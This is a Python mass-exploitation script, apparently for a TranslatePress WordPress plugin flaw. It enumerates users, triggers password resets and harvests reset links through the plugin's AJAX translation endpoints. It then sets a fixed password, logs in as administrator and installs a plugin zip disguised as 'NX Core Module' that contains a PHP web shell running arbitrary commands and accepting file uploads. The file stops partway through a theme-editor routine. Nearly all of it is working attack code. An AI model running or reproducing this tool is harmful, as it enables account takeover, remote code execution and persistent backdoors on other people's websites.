#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import threading, requests, re, time, os, sys, json, io, zipfile, shutil, ctypes, urllib3, warnings
from queue import Queue, Empty
from urllib.parse import urlparse, urljoin, quote
from rich.console import Console
from rich.text import Text
from rich.panel import Panel
from rich import box
from rich.theme import Theme
from rich.table import Table

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
warnings.filterwarnings("ignore")
os.environ["NO_PROXY"] = "*"
try:
    sys.stdout.reconfigure(encoding="utf-8", errors="replace")
except Exception:
    pass

theme = Theme({
    "banner": "bold magenta",
    "accent": "bold yellow",
    "ok": "bold bright_green",
    "fail": "bold bright_red",
    "info": "bright_cyan",
    "dim": "dim white",
    "highlight": "bold bright_yellow",
    "card": "bold green",
    "warn": "bold bright_magenta",
})
console = Console(theme=theme, force_terminal=True, color_system="truecolor", soft_wrap=True)

UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
TIMEOUT = 18
SHELLS_FILE = "shells.txt"
SIG = "Nx-zD"
FIXED_PASS = "Nx_admin_@!KSA"
DEFAULT_THREADS = 5
SCRIPT_DIR = os.path.dirname(os.path.abspath(__file__))

AUTHOR_RE = re.compile(r'/author/([^/\s"\'<>]+)')
AUTHOR_BODY_PATTERNS = [
    re.compile(r'author-\w+">([a-z0-9_-]+)<'),
    re.compile(r'/author/([a-z0-9_-]+)/'),
    re.compile(r'"slug":"([a-z0-9_-]+)"'),
    re.compile(r'"username":"([a-z0-9_-]+)"'),
]
RESET_LINK_RE = re.compile(
    r'(https?://[^\s<>"\']+(?:wp-login\.php)[^\s<>"\']*(?:action=rp|action=resetpass)[^\s<>"\']*key=[^\s<>"\']*)',
    re.IGNORECASE
)

targets_queue = Queue()
stats = {"total": 0, "done": 0, "takeover": 0, "vuln": 0, "safe": 0, "error": 0}
stats_lock = threading.Lock()
file_lock = threading.Lock()

ESC = "\033["
RESET_C = ESC + "0m"
BOLD_C = ESC + "1m"
DIM_C = ESC + "2m"
RED_C = ESC + "91m"
DARK_RED_C = ESC + "31m"
GREEN_C = ESC + "92m"
WHITE_C = ESC + "97m"
GRAY_C = ESC + "90m"


def enable_ansi():
    if os.name != "nt":
        return True
    try:
        kernel32 = ctypes.windll.kernel32
        handle = kernel32.GetStdHandle(-11)
        mode = ctypes.c_uint32()
        if kernel32.GetConsoleMode(handle, ctypes.byref(mode)):
            kernel32.SetConsoleMode(handle, mode.value | 0x0004)
            return True
    except Exception:
        pass
    return False


ANSI = enable_ansi()


def ac(text, color):
    if not ANSI:
        return str(text)
    return f"{color}{text}{RESET_C}"


def terminal_width():
    try:
        w = shutil.get_terminal_size(fallback=(100, 30)).columns
    except Exception:
        w = 100
    return max(60, min(w, 150))


def set_terminal_title(title):
    try:
        if os.name == "nt":
            ctypes.windll.kernel32.SetConsoleTitleW(title)
        else:
            sys.stdout.write(f"\033]0;{title}\007")
            sys.stdout.flush()
    except Exception:
        pass


NX_LOGO = [
    "███╗   ██╗██╗  ██╗",
    "████╗  ██║╚██╗██╔╝",
    "██╔██╗ ██║ ╚███╔╝ ",
    "██║╚██╗██║ ██╔██╗ ",
    "██║ ╚████║██╔╝ ██╗",
    "╚═╝  ╚═══╝╚═╝  ╚═╝",
]


def full_banner():
    width = terminal_width()
    frame_width = max(60, min(width - 4, 112))
    indent = max((width - frame_width) // 2, 0)
    pad = " " * indent

    def make_content(parts):
        raw = "".join(t for t, _ in parts)
        avail = frame_width - 4
        if len(raw) > avail:
            raw = raw[:avail - 3] + "..."
            parts = [(raw, WHITE_C)]
        left = max((avail - len(raw)) // 2, 0)
        right = max(avail - len(raw) - left, 0)
        out = ac("║", DARK_RED_C) + " " + (" " * left)
        for t, col in parts:
            out += ac(t, col)
        out += (" " * right) + " " + ac("║", DARK_RED_C)
        return out

    print()
    print(pad + ac("╔" + "═" * (frame_width - 2) + "╗", DARK_RED_C))
    empty = ac("║", DARK_RED_C) + " " * (frame_width - 2) + ac("║", DARK_RED_C)
    print(pad + empty)

    logo_w = max(len(r) for r in NX_LOGO)
    logo_area = frame_width - 2
    for row in NX_LOGO:
        lp = max((logo_area - logo_w) // 2, 0)
        rp = max(logo_area - logo_w - lp, 0)
        print(pad + ac("║", DARK_RED_C) + " " * lp + ac(row, BOLD_C + RED_C) + " " * rp + ac("║", DARK_RED_C))

    print(pad + empty)
    print(pad + ac("╠", DARK_RED_C) + ac("═" * (frame_width - 2), GRAY_C) + ac("╣", DARK_RED_C))

    print(pad + make_content([
        ("CVE-2026-19632", BOLD_C + RED_C),
        ("   │   ", GRAY_C),
        ("Takeover and Upload shell", BOLD_C + WHITE_C),
    ]))

    print(pad + make_content([
        ("Nxploited", BOLD_C + RED_C),
        (" ZeroDay Hub", BOLD_C + WHITE_C),
    ]))

    print(pad + ac("╠", DARK_RED_C) + ac("═" * (frame_width - 2), GRAY_C) + ac("╣", DARK_RED_C))

    plat = "WINDOWS" if os.name == "nt" else "LINUX" if sys.platform.startswith("linux") else sys.platform.upper()
    info = f"NX CORE  •  {plat}  •  TERMINAL {width} COLS  •  READY"
    print(pad + make_content([(info, DIM_C + GRAY_C)]))

    print(pad + ac("╚" + "═" * (frame_width - 2) + "╝", DARK_RED_C))
    if ANSI:
        sw = frame_width - 6
        print(pad + "   " + ac("▀" * max(sw, 1), DIM_C + DARK_RED_C))
    print()


def resolve_path(p):
    if os.path.isabs(p):
        return p
    check = os.path.join(os.getcwd(), p)
    if os.path.exists(check):
        return check
    check2 = os.path.join(SCRIPT_DIR, p)
    if os.path.exists(check2):
        return check2
    return os.path.join(os.getcwd(), p)


def write_shell(line):
    with file_lock:
        try:
            p = os.path.join(SCRIPT_DIR, SHELLS_FILE)
            with open(p, "a", encoding="utf-8") as f:
                f.write(line + "\n")
        except Exception:
            pass


def mk_sess():
    s = requests.Session()
    s.headers["User-Agent"] = UA
    s.verify = False
    return s


def extract_trp_data(html):
    idx = html.find("trp-dynamic-translator-js-extra")
    if idx != -1:
        chunk_start = max(0, idx - 50)
        script_m = re.search(r'>\s*(var\s+trp_data\s*=\s*)', html[chunk_start:chunk_start + 200])
        if script_m:
            json_start = chunk_start + script_m.end()
            end_tag = html.find("</script>", json_start)
            if end_tag != -1:
                raw = html[json_start:end_tag].strip().rstrip(";").strip()
                try:
                    return json.loads(raw)
                except Exception:
                    pass

    m = re.search(r'var\s+trp_data\s*=\s*', html)
    if not m:
        return None

    start = m.end()
    depth = 0
    in_str = False
    esc = False
    limit = min(start + 30000, len(html))
    for i in range(start, limit):
        ch = html[i]
        if esc:
            esc = False
            continue
        if ch == '\\' and in_str:
            esc = True
            continue
        if ch == '"':
            in_str = not in_str
            continue
        if in_str:
            continue
        if ch in ('{', '['):
            depth += 1
        elif ch in ('}', ']'):
            depth -= 1
            if depth == 0:
                try:
                    return json.loads(html[start:i + 1])
                except Exception:
                    pass
                break
    return None


def find_secondary_urls(html, base):
    urls = []
    seen = set()
    parsed = urlparse(base)

    for m in re.finditer(r'<link\b[^>]*>', html, re.IGNORECASE):
        tag = m.group(0)
        if 'alternate' not in tag.lower():
            continue
        lang_m = re.search(r'hreflang=["\']([^"\']+)["\']', tag, re.IGNORECASE)
        href_m = re.search(r'href=["\']([^"\']+)["\']', tag, re.IGNORECASE)
        if lang_m and href_m:
            lang = lang_m.group(1)
            url = href_m.group(1)
            if lang.lower() in ('x-default',):
                continue
            if url.startswith('/'):
                url = f"{parsed.scheme}://{parsed.netloc}{url}"
            norm = url.rstrip('/')
            if norm not in seen and norm != base.rstrip('/'):
                urls.append((lang.replace('-', '_'), url))
                seen.add(norm)

    for m in re.finditer(r'<a\b[^>]*?data-trp-language=["\']([^"\']+)["\'][^>]*?>', html, re.IGNORECASE):
        lang = m.group(1)
        tag = m.group(0)
        href_m = re.search(r'href=["\']([^"\']+)["\']', tag, re.IGNORECASE)
        if href_m:
            url = href_m.group(1)
            if url.startswith('/'):
                url = f"{parsed.scheme}://{parsed.netloc}{url}"
            if url.startswith('#') or 'javascript:' in url.lower():
                continue
            norm = url.rstrip('/')
            if norm not in seen and norm != base.rstrip('/'):
                urls.append((lang, url))
                seen.add(norm)

    for m in re.finditer(r'<a\b[^>]*?class=["\'][^"\']*trp-ls-link[^"\']*["\'][^>]*?>', html, re.IGNORECASE):
        tag = m.group(0)
        href_m = re.search(r'href=["\']([^"\']+)["\']', tag, re.IGNORECASE)
        lang_m = re.search(r'data-trp-language=["\']([^"\']+)["\']', tag, re.IGNORECASE)
        if href_m:
            url = href_m.group(1)
            if url.startswith('/'):
                url = f"{parsed.scheme}://{parsed.netloc}{url}"
            if url.startswith('#') or 'javascript:' in url.lower():
                continue
            lang = lang_m.group(1) if lang_m else "unknown"
            norm = url.rstrip('/')
            if norm not in seen and norm != base.rstrip('/'):
                urls.append((lang, url))
                seen.add(norm)

    return urls


def detect_default_language(html, trp_data=None):
    if trp_data:
        ol = trp_data.get("trp_original_language")
        if ol:
            return ol
    m = re.search(r'<html[^>]*\blang=["\']([^"\']+)["\']', html, re.IGNORECASE)
    if m:
        return m.group(1).replace('-', '_')
    return "en_US"


def detect_translatepress(sess, base):
    indicators = [
        "translatepress", "trp-language-switcher", "trp_data",
        "data-trp-translate-id", "data-trp-node-group",
        "trp-dynamic-translator", "data-no-translation",
        "translatepress-multilingual",
    ]
    for ep in ["", "/sample-page", "/about", "/contact", "/home"]:
        try:
            r = sess.get(f"{base}{ep}", timeout=TIMEOUT, allow_redirects=True)
            if any(ind in r.text.lower() for ind in indicators):
                return True, r.text
        except Exception:
            continue
    return False, ""


def get_nonce_and_data(sess, base, initial_html=""):
    trp = extract_trp_data(initial_html) if initial_html else None
    if trp and trp.get("gettranslationsnonceregular"):
        return trp

    secondary_urls = find_secondary_urls(initial_html, base) if initial_html else []

    for lang, url in secondary_urls:
        try:
            r = sess.get(url, timeout=TIMEOUT, allow_redirects=True)
            trp = extract_trp_data(r.text)
            if trp and trp.get("gettranslationsnonceregular"):
                return trp
        except Exception:
            continue

    try:
        r = sess.get(f"{base}/?trp-edit-translation=preview", timeout=TIMEOUT, allow_redirects=True)
        trp = extract_trp_data(r.text)
        if trp and trp.get("gettranslationsnonceregular"):
            return trp
    except Exception:
        pass

    lang_slugs = [
        "ar", "fr", "de", "es", "it", "pt-br", "pt", "nl", "ru", "ja",
        "zh", "ko", "tr", "pl", "sv", "da", "fi", "nb", "cs", "ro",
        "hu", "el", "bg", "hr", "sk", "sl", "uk", "vi", "th", "id",
        "ms", "he", "fa", "hi", "ca", "en", "sq", "sr", "lt", "lv",
        "et", "ka", "mk", "gl", "eu", "bs", "az", "hy", "sw", "af",
    ]

    for slug in lang_slugs:
        try:
            r = sess.get(f"{base}/{slug}/", timeout=TIMEOUT, allow_redirects=True)
            if r.url.rstrip('/') == base.rstrip('/'):
                continue
            trp = extract_trp_data(r.text)
            if trp and trp.get("gettranslationsnonceregular"):
                return trp
        except Exception:
            continue

    return None


def detect_languages(trp_data, page_html, base):
    langs = set()
    default_lang = "en_US"

    if trp_data:
        default_lang = trp_data.get("trp_original_language", "en_US")
        tl = trp_data.get("trp_language_to_query")
        if tl and tl != default_lang:
            langs.add(tl)
        cl = trp_data.get("trp_current_language")
        if cl and cl != default_lang:
            langs.add(cl)

    if page_html:
        for m in re.finditer(r'data-trp-language=["\']([^"\']+)["\']', page_html, re.IGNORECASE):
            lc = m.group(1)
            if lc != default_lang:
                langs.add(lc)

        secondary_urls = find_secondary_urls(page_html, base)
        for lang_code, url in secondary_urls:
            if lang_code != default_lang and lang_code != "unknown":
                langs.add(lang_code)

    if not langs:
        html_lang = detect_default_language(page_html) if page_html else "en_US"
        default_lang = html_lang
        for c in ["ar", "fr_FR", "de_DE", "es_ES", "it_IT", "pt_BR", "pt_PT", "nl_NL"]:
            langs.add(c)

    return list(langs), default_lang


def enumerate_usernames(sess, base):
    users = set()

    try:
        r = sess.get(f"{base}/wp-json/wp/v2/users?per_page=100", timeout=TIMEOUT)
        if r.status_code == 200:
            data = r.json()
            if isinstance(data, list):
                for u in data:
                    slug = u.get("slug")
                    if slug:
                        users.add(slug)
                    uname = u.get("username")
                    if uname:
                        users.add(uname)
    except Exception:
        pass

    for i in range(1, 15):
        try:
            r = sess.get(f"{base}/?author={i}", timeout=TIMEOUT, allow_redirects=False)
            if r.status_code in (301, 302):
                loc = r.headers.get("Location", "")
                m = AUTHOR_RE.search(loc)
                if m:
                    users.add(m.group(1))
            elif r.status_code == 200:
                for m_val in AUTHOR_RE.findall(r.text):
                    users.add(m_val)
                for pat in AUTHOR_BODY_PATTERNS:
                    for m_val in pat.findall(r.text):
                        users.add(m_val)
        except Exception:
            continue

    try:
        r = sess.get(f"{base}/wp-json/wp/v2/users?per_page=100&page=1&context=embed", timeout=TIMEOUT)
        if r.status_code == 200:
            data = r.json()
            if isinstance(data, list):
                for u in data:
                    slug = u.get("slug")
                    if slug:
                        users.add(slug)
    except Exception:
        pass

    domain = urlparse(base).netloc.split('.')[0].replace('www', '')
    if domain and len(domain) > 2:
        users.add(domain)

    users.add("admin")

    users = {u for u in users if u and len(u) > 1 and u not in ("wp", "wordpress", "page", "post", "feed")}
    return list(users)[:14]


def trigger_password_reset(sess, base, username):
    try:
        r = sess.get(f"{base}/wp-login.php?action=lostpassword", timeout=TIMEOUT)
        nonce_match = re.search(r'name="_wpnonce"\s+value="([^"]+)"', r.text)
        wp_nonce = nonce_match.group(1) if nonce_match else ""
        if not nonce_match:
            nonce_match = re.search(r'_wpnonce.*?value=["\']([^"\']+)["\']', r.text)
            wp_nonce = nonce_match.group(1) if nonce_match else ""

        data = {"user_login": username, "redirect_to": "", "wp-submit": "Get New Password"}
        if wp_nonce:
            data["_wpnonce"] = wp_nonce

        r2 = sess.post(f"{base}/wp-login.php?action=lostpassword", data=data, timeout=TIMEOUT, allow_redirects=False)

        if r2.status_code in (301, 302, 303):
            loc = r2.headers.get("Location", "")
            if "checkemail" in loc or "confirm" in loc:
                return True, "reset_sent"
            if "lostpassword" not in loc and "error" not in loc:
                return True, "reset_sent"

        if r2.status_code == 200:
            txt_lower = r2.text.lower()
            if "check your email" in txt_lower or "email has been sent" in txt_lower or "checkemail" in txt_lower:
                return True, "reset_sent"

            error_indicators = [
                "invalid username", "no account found", "there is no account",
                "error", "invalid", "not registered", "no user found",
                "class=\"login_error\"", "id=\"login_error\"",
            ]
            has_error = any(ind in txt_lower for ind in error_indicators)

            if has_error:
                return False, f"HTTP{r2.status_code}"

            return True, "reset_likely_sent"

        return False, f"HTTP{r2.status_code}"
    except Exception as e:
        return False, str(e)[:60]


def query_dictionary_admin_ajax(sess, base, nonce, language, string_ids=None, originals=None):
    data = {
        "action": "trp_get_translations_regular",
        "security": nonce,
        "language": language,
        "all_languages": "false",
        "dynamic_strings": "true",
        "skip_machine_translation": "[]",
    }
    if string_ids:
        data["string_ids"] = json.dumps(string_ids)
    if originals:
        data["originals"] = json.dumps(originals)
    try:
        r = sess.post(f"{base}/wp-admin/admin-ajax.php", data=data, timeout=TIMEOUT)
        if r.status_code == 200:
            txt = r.text.strip()
            if txt in ('0', '-1', ''):
                return None, f"wp_ajax_reject({txt})"
            try:
                result = r.json()
                if result == 0 or result == -1:
                    return None, f"wp_ajax_reject({result})"
                return result, None
            except Exception:
                return None, "json_parse_error"
        return None, f"HTTP{r.status_code}"
    except Exception as e:
        return None, str(e)[:60]


def query_dictionary_trp_ajax(sess, base, language, originals, original_language="en_US"):
    data = {
        "action": "trp_get_translations_regular",
        "language": language,
        "original_language": original_language,
        "originals": json.dumps(originals),
        "skip_machine_translation": "[]",
        "dynamic_strings": "true",
    }
    for path in ["/wp-content/plugins/translatepress-multilingual/includes/trp-ajax.php",
                 "/wp-content/plugins/translatepress/includes/trp-ajax.php"]:
        try:
            r = sess.post(f"{base}{path}", data=data, timeout=TIMEOUT)
            if r.status_code == 200:
                txt = r.text.strip()
                if not txt or txt == '"error"' or txt == '0':
                    continue
                try:
                    result = r.json()
                    if isinstance(result, str) and ("error" in result.lower() or "invalid" in result.lower()):
                        continue
                    if isinstance(result, (list, dict)):
                        return result, None
                except Exception:
                    pass
        except Exception:
            continue
    return None, "trp_ajax_unavailable"


def extract_reset_links(data):
    links = set()

    def scan_text(text):
        if not text or not isinstance(text, str):
            return
        if 'key=' not in text and 'action=rp' not in text.lower():
            return
        found = RESET_LINK_RE.findall(text)
        for f in found:
            links.add(f)
        if not found and 'wp-login.php' in text and 'key=' in text:
            m = re.search(r'(https?://[^\s<>"\']+wp-login\.php[^\s<>"\']*key=[^\s<>"\']*)', text, re.IGNORECASE)
            if m:
                links.add(m.group(1))

    def walk(obj):
        if isinstance(obj, str):
            scan_text(obj)
        elif isinstance(obj, list):
            for item in obj:
                walk(item)
        elif isinstance(obj, dict):
            for key, val in obj.items():
                walk(val)

    walk(data)
    return list(links)


def search_dictionary_by_ids(sess, base, nonce, language, batch_size=100):
    all_links = []
    max_id_with_data = 0
    nonce_dead = False

    start = 1
    empty_run = 0
    while empty_run < 8 and start <= 15000:
        ids = list(range(start, start + batch_size))
        result, err = query_dictionary_admin_ajax(sess, base, nonce, language, string_ids=ids)
        if err and ("nonce" in str(err).lower() or "reject" in str(err).lower()):
            nonce_dead = True
            break
        if result and isinstance(result, (list, dict)):
            entry_count = len(result) if isinstance(result, list) else len(result.keys())
            if entry_count > 0:
                empty_run = 0
                max_id_with_data = start + batch_size
                found = extract_reset_links(result)
                if found:
                    all_links.extend(found)
            else:
                empty_run += 1
        else:
            empty_run += 1
        start += batch_size

    if nonce_dead:
        return all_links, max_id_with_data

    probes = [20000, 50000, 100000, 200000, 500000]
    for p in probes:
        ids = list(range(p, p + batch_size))
        result, err = query_dictionary_admin_ajax(sess, base, nonce, language, string_ids=ids)
        if err and ("nonce" in str(err).lower() or "reject" in str(err).lower()):
            break
        if result and isinstance(result, (list, dict)):
            entry_count = len(result) if isinstance(result, list) else len(result.keys())
            if entry_count > 0:
                max_id_with_data = max(max_id_with_data, p + batch_size)
                found = extract_reset_links(result)
                if found:
                    all_links.extend(found)

    if max_id_with_data > 15000:
        tail_start = max(max_id_with_data - 500, 15001)
        tail_empty = 0
        while tail_empty < 5 and tail_start <= max_id_with_data + 3000:
            ids = list(range(tail_start, tail_start + batch_size))
            result, err = query_dictionary_admin_ajax(sess, base, nonce, language, string_ids=ids)
            if err and ("nonce" in str(err).lower() or "reject" in str(err).lower()):
                break
            if result and isinstance(result, (list, dict)):
                entry_count = len(result) if isinstance(result, list) else len(result.keys())
                if entry_count > 0:
                    tail_empty = 0
                    max_id_with_data = max(max_id_with_data, tail_start + batch_size)
                    found = extract_reset_links(result)
                    if found:
                        all_links.extend(found)
                else:
                    tail_empty += 1
            else:
                tail_empty += 1
            tail_start += batch_size

    return all_links, max_id_with_data


def search_dictionary_by_trp_ajax(sess, base, language, default_lang):
    originals_to_try = [
        "Someone has requested a password reset for the following account:",
        "If this was a mistake, just ignore this email and nothing will happen.",
        "To reset your password, visit the following address:",
        "Password Reset", "Password reset", "[%s] Password Reset",
    ]
    all_links = []
    result, err = query_dictionary_trp_ajax(sess, base, language, originals_to_try, default_lang)
    if result:
        found = extract_reset_links(result)
        if found:
            all_links.extend(found)
    return all_links


def verify_reset_link(sess, link):
    try:
        r = sess.get(link, timeout=TIMEOUT, allow_redirects=True)
        final_url = r.url.lower()

        if "error=invalidkey" in final_url or "error=expiredkey" in final_url or "error=" in final_url:
            return False, "EXPIRED_URL"

        if r.status_code == 200:
            txt = r.text.lower()
            if 'id="pass1"' in r.text or 'name="pass1"' in r.text:
                return True, "VALID"
            if "new password" in txt or "reset password" in txt or "enter your new password" in txt:
                return True, "VALID"
            if "expired" in txt or "invalid key" in txt or "invalid" in txt and "link" in txt:
                return False, "EXPIRED"
            if "action=rp" in final_url or "action=resetpass" in final_url:
                if "error=" not in final_url:
                    return True, "VALID"
            if "lostpassword" in final_url:
                return False, "REDIRECTED_LOST"
        return False, f"HTTP{r.status_code}"
    except Exception as e:
        return False, str(e)[:40]


def test_endpoint_accessible(sess, base, nonce, language):
    result, err = query_dictionary_admin_ajax(sess, base, nonce, language, string_ids=[1, 2, 3, 4, 5])
    if err:
        return False, err
    if result is not None:
        return True, "accessible"
    return False, "empty"


def change_password(sess, reset_link):
    try:
        r = sess.get(reset_link, timeout=TIMEOUT, allow_redirects=True)
        if r.status_code != 200:
            m2 = re.search(r'login=([^&\s"\']+)', reset_link)
            return False, m2.group(1) if m2 else "", f"HTTP{r.status_code}"

        txt = r.text
        final_url = r.url
        txt_lower = txt.lower()
        final_url_lower = final_url.lower()

        if "error=invalidkey" in final_url_lower or "error=expiredkey" in final_url_lower or "error=" in final_url_lower:
            m2 = re.search(r'login=([^&\s"\']+)', reset_link)
            return False, m2.group(1) if m2 else "", "EXPIRED_URL"

        if 'class="login_error"' in txt_lower or 'id="login_error"' in txt_lower:
            if "expired" in txt_lower or "invalid" in txt_lower:
                m2 = re.search(r'login=([^&\s"\']+)', reset_link)
                return False, m2.group(1) if m2 else "", "EXPIRED"

        if "lostpassword" in final_url_lower and "action=rp" not in final_url_lower and "action=resetpass" not in final_url_lower:
            m2 = re.search(r'login=([^&\s"\']+)', reset_link)
            return False, m2.group(1) if m2 else "", "EXPIRED_URL"

        has_form = 'id="pass1"' in txt or 'name="pass1"' in txt or 'type="password"' in txt_lower
        if not has_form:
            m2 = re.search(r'login=([^&\s"\']+)', reset_link)
            return False, m2.group(1) if m2 else "", "NO_FORM"

        user_m = re.search(r'(?:id|name)="user_login"\s+value="([^"]*)"', txt)
        username = user_m.group(1) if user_m else ""
        if not username:
            user_m2 = re.search(r'value="([^"]*)"[^>]*(?:id|name)="user_login"', txt)
            username = user_m2.group(1) if user_m2 else ""
        if not username:
            m2 = re.search(r'login=([^&\s"\']+)', final_url)
            username = m2.group(1) if m2 else ""
        if not username:
            m2 = re.search(r'login=([^&\s"\']+)', reset_link)
            username = m2.group(1) if m2 else ""

        rp_key_m = re.search(r'name="rp_key"\s+value="([^"]*)"', txt)
        rp_key = rp_key_m.group(1) if rp_key_m else ""
        if not rp_key:
            rp_key_m2 = re.search(r'value="([^"]*)"[^>]*name="rp_key"', txt)
            rp_key = rp_key_m2.group(1) if rp_key_m2 else ""
        if not rp_key:
            km = re.search(r'[?&]key=([a-zA-Z0-9:]+)', final_url)
            rp_key = km.group(1) if km else ""
        if not rp_key:
            km2 = re.search(r'[?&]key=([a-zA-Z0-9:]+)', reset_link)
            rp_key = km2.group(1) if km2 else ""

        if not rp_key:
            return False, username, "NO_KEY"

        nonce_m = re.search(r'name="_wpnonce"\s+value="([^"]*)"', txt)
        if not nonce_m:
            nonce_m = re.search(r'value="([^"]*)"[^>]*name="_wpnonce"', txt)
        if not nonce_m:
            nonce_m = re.search(r'_wpnonce["\s]*value=["\']([^"\']+)["\']', txt)
        wp_nonce = nonce_m.group(1) if nonce_m else ""

        parsed = urlparse(final_url)
        base_url = f"{parsed.scheme}://{parsed.netloc}"

        action_m = re.search(r'<form[^>]*action=["\']([^"\']*)["\']', txt, re.I)
        action_url = ""
        if action_m:
            action_url = action_m.group(1)
        if not action_url:
            action_url = f"{base_url}/wp-login.php?action=resetpass"
        elif action_url.startswith('/'):
            action_url = f"{base_url}{action_url}"
        elif not action_url.startswith('http'):
            action_url = f"{base_url}/{action_url}"
        action_url = action_url.replace('&amp;', '&')

        post_data = {
            "pass1": FIXED_PASS,
            "pass2": FIXED_PASS,
            "rp_key": rp_key,
            "wp-submit": "Save Password",
        }
        if wp_nonce:
            post_data["_wpnonce"] = wp_nonce
        if username:
            post_data["user_login"] = username
        if 'pw-weak' in txt or 'pw_weak' in txt:
            post_data["pw_weak"] = "on"

        r2 = sess.post(action_url, data=post_data, timeout=TIMEOUT, allow_redirects=False)

        if r2.status_code in (301, 302, 303):
            loc = r2.headers.get("Location", "")
            loc_lower = loc.lower()

            if "error=" in loc_lower and "invalidkey" in loc_lower:
                return False, username, "KEY_CONSUMED"

            if "password=reset" in loc_lower or "password-reset" in loc_lower or "loggedout" in loc_lower:
                return True, username, "OK"
            if "login_updated" in loc_lower or "password=changed" in loc_lower:
                return True, username, "OK"
            if "checkemail" in loc_lower:
                return True, username, "OK"
            if "wp-login" in loc_lower and "error=" not in loc_lower and "lostpassword" not in loc_lower:
                return True, username, "OK"

            if loc.startswith('/'):
                full_loc = f"{base_url}{loc}"
            elif not loc.startswith('http'):
                full_loc = f"{base_url}/{loc}"
            else:
                full_loc = loc
            try:
                r3 = sess.get(full_loc, timeout=TIMEOUT, allow_redirects=True)
                if 'id="pass1"' not in r3.text and 'name="pass1"' not in r3.text:
                    if "error=" not in r3.url.lower():
                        return True, username, "OK"
            except Exception:
                return True, username, "OK_REDIRECT"

        r2_text = r2.text if hasattr(r2, 'text') else ""
        r2_lower = r2_text.lower()
        r2_url = r2.url.lower() if hasattr(r2, 'url') else ""

        if "password=reset" in r2_url or "password-reset" in r2_url:
            return True, username, "OK"
        if "loggedout=true" in r2_url or "password=changed" in r2_url:
            return True, username, "OK"

        has_pass1_after = 'id="pass1"' in r2_text or 'name="pass1"' in r2_text
        has_error_after = 'class="login_error"' in r2_lower or 'id="login_error"' in r2_lower
        has_error_url = "error=" in r2_url or "lostpassword" in r2_url

        if has_error_after or has_error_url:
            return False, username, "FORM_ERROR"

        if has_pass1_after:
            return False, username, "FORM_RESHOWN"

        if r2.status_code == 200:
            return True, username, "OK"

        msg_m = re.search(r'class="message"[^>]*>(.*?)</p>', r2_text, re.I | re.DOTALL)
        if msg_m:
            return True, username, "OK"

        return True, username, "OK_ASSUMED"
    except Exception as e:
        return False, "", str(e)[:60]


def wp_login(sess, base, username, password):
    try:
        sess.get(f"{base}/wp-login.php", timeout=TIMEOUT)
        sess.cookies.set("wordpress_test_cookie", "WP Cookie check")
        data = {
            "log": username,
            "pwd": password,
            "wp-submit": "Log In",
            "redirect_to": f"{base}/wp-admin/",
            "testcookie": "1",
        }
        r2 = sess.post(f"{base}/wp-login.php", data=data, timeout=TIMEOUT, allow_redirects=False)

        if r2.status_code in (301, 302, 303):
            loc = r2.headers.get("Location", "")
            if "wp-admin" in loc and "wp-login" not in loc:
                try:
                    r3 = sess.get(loc if loc.startswith("http") else f"{base}{loc}", timeout=TIMEOUT, allow_redirects=True)
                    if "/wp-admin" in r3.url and "wp-login" not in r3.url:
                        return True
                except Exception:
                    pass
                return True

        r2f = sess.get(r2.headers.get("Location", f"{base}/wp-admin/") if r2.status_code in (301,302,303) else r2.url, timeout=TIMEOUT, allow_redirects=True)
        if "/wp-admin" in r2f.url and "wp-login" not in r2f.url:
            return True
        if "dashboard" in r2f.text.lower() or "adminmenu" in r2f.text.lower():
            return True

        for ck_name in sess.cookies.keys():
            if "wordpress_logged_in" in ck_name.lower():
                return True

        return False
    except Exception:
        return False


def create_shell_plugin():
    php = f'''<?php
/**
 * Plugin Name: NX Core Module
 * Description: Core system module
 * Version: 1.0
 * Author: System
 */
if(isset($_GET['nx'])) {{
    if($_GET['nx']=='{SIG}') {{
        echo '{SIG}';
        if(isset($_GET['cmd'])) {{
            echo '<pre>'.shell_exec($_GET['cmd']).'</pre>';
        }}
        if(isset($_FILES['f'])) {{
            move_uploaded_file($_FILES['f']['tmp_name'], $_FILES['f']['name']);
            echo 'uploaded:'.$_FILES['f']['name'];
        }}
    }}
    die();
}}
?>'''
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, 'w', zipfile.ZIP_DEFLATED) as zf:
        zf.writestr('nx-core/nx-core.php', php)
        zf.writestr('nx-core/readme.txt', 'NX Core Module v1.0')
    buf.seek(0)
    return buf.getvalue()


def try_plugin_upload(sess, base):
    try:
        r = sess.get(f"{base}/wp-admin/plugin-install.php?tab=upload", timeout=TIMEOUT)
        if r.status_code != 200:
            return None
        nm = re.search(r'name="_wpnonce"\s+value="([^"]+)"', r.text)
        if not nm:
            nm = re.search(r'_wpnonce.*?value=["\']([^"\']+)["\']', r.text)
        if not nm:
            return None
        nonce = nm.group(1)
        plugin_zip = create_shell_plugin()
        files = {'pluginzip': ('nx-core.zip', plugin_zip, 'application/zip')}
        form = {
            '_wpnonce': nonce,
            '_wp_http_referer': '/wp-admin/plugin-install.php?tab=upload',
            'install-plugin-submit': 'Install Now',
        }
        r2 = sess.post(f"{base}/wp-admin/update.php?action=upload-plugin", data=form, files=files, timeout=30)
        if r2.status_code == 200 and ('successfully' in r2.text.lower() or 'installed' in r2.text.lower()):
            activate_m = re.search(r'href=["\']([^"\']*action=activate[^"\']*plugin=nx-core[^"\']*)["\']', r2.text)
            if activate_m:
                act_url = activate_m.group(1)
                if act_url.startswith('/'):
                    p = urlparse(base)
                    act_url = f"{p.scheme}://{p.netloc}{act_url}"
                elif not act_url.startswith('http'):
                    act_url = f"{base}/wp-admin/{act_url}"
                act_url = act_url.replace('&amp;', '&')
                sess.get(act_url, timeout=TIMEOUT)
            shell_url = f"{base}/wp-content/plugins/nx-core/nx-core.php?nx={SIG}"
            try:
                rv = sess.get(shell_url, timeout=TIMEOUT)
                if SIG in rv.text:
                    return shell_url
            except Exception:
                pass
            return shell_url
    except Exception:
        pass
    return None


def try_theme_editor(sess, base):
    try:
        r = sess.get(f"{base}/wp-admin/theme-editor.php", timeout=TIMEOUT)
        if r.status_code != 200:
            return None
        nm = re.search(r'name="_wpnonce"\s+value="([^"]+)"', r.text)
        if not nm:
            nm = re.search(r'nonce.*?value=["\']([^"\']+)["\']', r.text)
        if not nm:
            return None
        theme_m = re.search(r'name="theme"\s+value="([^"]+)"', r.text)
        theme = theme_m.group(1) if theme_m else ""
        if not theme:
            tm2 = re.search(r'themes/([^/]+)/', r.text)
            theme = tm2.group(1) if tm2 else ""
